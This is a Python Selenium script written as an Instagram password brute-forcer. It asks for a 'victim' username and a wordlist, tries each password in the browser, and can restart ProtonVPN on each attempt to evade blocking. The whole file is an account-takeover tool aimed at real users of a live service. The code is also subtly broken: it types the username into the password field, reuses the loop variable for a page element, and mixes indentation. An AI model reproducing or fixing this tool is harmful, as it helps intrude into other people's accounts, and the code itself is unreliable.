from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from colorama import Fore
import os
import pyautogui
import time as t
b = webdriver.Firefox(executable_path="//home//kali//Desktop//geckodriver")
victim = input(Fore.GREEN + "[*] Target username: ")
passlist = input(Fore.GREEN + "[*] Wordlist: ")
passlist = open(passlist, "r")
timeout = int(input(Fore.BLUE + "\n[*] Timeout between each password (Secs): "))
vpn = input(Fore.WHITE + "\n{-} Do you want to use a VPN? This will take a long time (y/n) ")
print(Fore.WHITE + "To use the VPN, you need to install and configure ProtonVPN CLI manually.")
print(Fore.RED + "\n\n[-] Please wait for a moment")
t.sleep(2)
def startvpn():
	os.system("sudo protonvpn c -f")
def crackvpn():
	for password in passlist:
		b.get("https://www.instagram.com")
                # Start VPN
		startvpn()
		print(Fore.YELLOW + "Trying password " + "(" + password + ")")
		t.sleep(timeout)
		username = b.find_element_by_xpath('//*[@id="react-root"]/section/main/article/div[2]/div[1]/div/form/div[2]/div/label/input')
		username.click()
		username.send_keys(victim)
		password = b.find_element_by_xpath('//*[@id="react-root"]/section/main/article/div[2]/div[1]/div/form/div[3]/div/label/input')
		password.click()
		password.send_keys(victim)
		login = b.find_element_by_xpath("/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div[4]/button")
		login.click()
		password.click()
		pyautogui.hotkey("ctrl", "a")
		pyautogui.press("backspace")
def crack():
        for password in passlist:
                b.get("https://www.instagram.com")
                print(Fore.YELLOW + "Trying password (" + password + ")")
                t.sleep(timeout)
                username = b.find_element_by_xpath('//*[@id="react-root"]/section/main/article/div[2]/div[1]/div/form/div[2]/div/label/input')
                username.click()
                username.send_keys(victim)
                password = b.find_element_by_xpath('//*[@id="react-root"]/section/main/article/div[2]/div[1]/div/form/div[3]/div/label/input')
                password.click()
                password.send_keys(victim)
                login = b.find_element_by_xpath("/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div[4]/button")
                login.click()
                password.click()
                pyautogui.hotkey("ctrl", "a")
                pyautogui.press("backspace")
if vpn == "y":
	crackvpn()
else:
	crack()
